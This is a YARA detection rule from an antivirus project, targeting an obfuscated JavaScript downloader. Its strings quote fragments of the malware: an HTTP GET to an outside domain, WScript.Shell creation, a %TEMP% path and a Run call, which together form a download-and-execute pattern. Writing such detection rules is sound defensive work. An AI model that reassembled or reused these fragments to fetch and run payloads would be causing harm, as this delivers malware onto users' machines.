rule sig_20160427_8745e06df61e736765f687ef7cb8c47a {
  meta:
    description = "datamaliciousorder - file 20160427_8745e06df61e736765f687ef7cb8c47a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8bf626b1048dc42ddb6270c3268e071ba3825da9aaf82b22698cc3358e2a9e79"

  strings:
    $s1  = "CmuzwEsesg[KvulmAmdrr](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function CkkgmOzmbv() {return HllzbRnypm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4h3u0oY" ascii
    $s3  = "function CkkgmOzmbv() {return HllzbRnypm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4h3u0oY" ascii
    $s4  = "function LltqpAfazk(TeioyWxjrj, AiagoBgmbz){RwbiaByrhf = RwbiaByrhf * 1; return TeioyWxjrj - AiagoBgmbz;};" fullword ascii
    $s5  = "var HllzbRnypm = function TipqkEajnz() {return JuibxXxgtl[UeziwRrlsg](\"WScript\"+\".Shell\");}(), OeojjTxmdw = 11;" fullword ascii
    $s6  = "var JuibxXxgtl = this[\"WScript\"];" fullword ascii
    $s7  = "if (CmuzwEsesg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function LrxkqWprqe(){return JjuacEejbw + \"\";};" fullword ascii
    $s9  = "function UdxzfXcjpd() {return ((CnrilXootc == true) && (CnrilXootc == XuwnuTygra)) ? 1 : RwbiaByrhf;};" fullword ascii
    $s10 = "function QzpirTgrrw(ZbfboBefdm) {var KolakMgvmz = (1, 2, 3, 4, 5, ZbfboBefdm); return KolakMgvmz;};" fullword ascii
    $s11 = "var CnrilXootc = false;" fullword ascii
    $s12 = "var XuwnuTygra = false;" fullword ascii
    $s13 = "var IgrmeZkwpf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var BngifClyvm = false;" fullword ascii
    $s15 = "function FmowvFopil(){return 23;};" fullword ascii
    $s16 = "XuwnuTygra = true; " fullword ascii
    $s17 = "function BzjjhCfpjv()" fullword ascii
    $s18 = "function DvwzqGuaef(LlnmqVibzp){HllzbRnypm[\"R\"+\"un\"](LlnmqVibzp, RwbiaByrhf, RwbiaByrhf);};" fullword ascii
    $s19 = "BngifClyvm = true;" fullword ascii
    $s20 = "return LltqpAfazk(PgtylEkjrs, SgscuJchzb);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}